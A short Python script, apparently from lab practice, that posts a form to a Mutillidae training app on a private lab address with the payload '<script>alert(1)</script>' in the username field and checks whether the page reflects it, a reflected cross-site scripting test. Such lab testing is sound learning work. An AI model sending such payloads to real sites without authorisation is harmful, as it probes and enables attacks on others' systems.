import asyncio
import aiohttp
import urllib.parse

async def run():
    async with aiohttp.ClientSession() as s:
        data = urllib.parse.urlencode({'password':'test','user-info-php-submit-button':'View Account Details','username':'<script>alert(1)</script>'})
        print(f"Data: {data}")
        async with s.post('http://192.168.56.102/mutillidae/index.php?page=user-info.php', headers={'Content-Type':'application/x-www-form-urlencoded'}, data=data, allow_redirects=False) as r:
            text = await r.text()
            print('<script>alert(1)</script>' in text)

asyncio.run(run())
